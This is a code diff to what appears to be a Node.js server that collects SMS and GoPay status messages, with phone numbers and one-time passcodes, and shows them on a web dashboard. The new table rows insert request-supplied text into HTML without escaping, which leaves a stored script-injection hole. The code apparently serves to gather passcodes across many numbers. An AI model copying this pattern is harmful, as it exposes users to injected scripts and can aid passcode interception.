@@ -97,15 +97,16 @@ app.post('/receive', (req, res) => {
  * Body: { text, server_number, PhoneNumber }
  */
 app.post('/statusgpay', (req, res) => {
-    const { text, server_number, PhoneNumber } = req.body;
+    const { text, server_number, PhoneNumber, status } = req.body;
     
-    console.log(`[GoPay] Status update from server ${server_number}: ${text}`);
+    console.log(`[GoPay] Status update [${status || 'INFO'}]: ${text}`);
 
     const entry = {
         server_number: server_number || 'Unknown',
         PhoneNumber: PhoneNumber || 'Unknown',
         sender: 'GoPay System',
         text: text || 'No status text provided',
+        status: status || null,
         otp: null,
         timestamp: new Date().toISOString()
     };
@@ -221,13 +222,24 @@ app.get('/', (req, res) => {
                         <th>Time</th>
                         <th>Srv #</th>
                         <th>Phone Number</th>
+                        <th>Status</th>
                         <th>Sender</th>
                         <th>Content</th>
-                        <th>Extracted OTP</th>
+                        <th>OTP</th>
                     </tr>
                 </thead>
                 <tbody>
-                    ${rows || '<tr><td colspan="6" style="text-align:center; padding: 20px;">Waiting for notifications...</td></tr>'}
+                    ${otpData.map(item => `
+                        <tr>
+                            <td style="padding: 10px; border-bottom: 1px solid #444;">${new Date(item.timestamp).toLocaleString()}</td>
+                            <td style="padding: 10px; border-bottom: 1px solid #444; color: #ffa500;">${item.server_number || '-'}</td>
+                            <td style="padding: 10px; border-bottom: 1px solid #444; color: #00d4ff;">${item.PhoneNumber || '-'}</td>
+                            <td style="padding: 10px; border-bottom: 1px solid #444;"><span style="background: #555; padding: 2px 6px; border-radius: 4px; font-size: 0.8em;">${item.status || '-'}</span></td>
+                            <td style="padding: 10px; border-bottom: 1px solid #444;">${item.sender || '-'}</td>
+                            <td style="padding: 10px; border-bottom: 1px solid #444;">${item.text || '-'}</td>
+                            <td style="padding: 10px; border-bottom: 1px solid #444; font-weight: bold; color: #00ff00;">${item.otp || '-'}</td>
+                        </tr>
+                    `).join('') || '<tr><td colspan="7" style="text-align:center; padding: 20px;">Waiting for notifications...</td></tr>'}
                 </tbody>
             </table>
         </div>
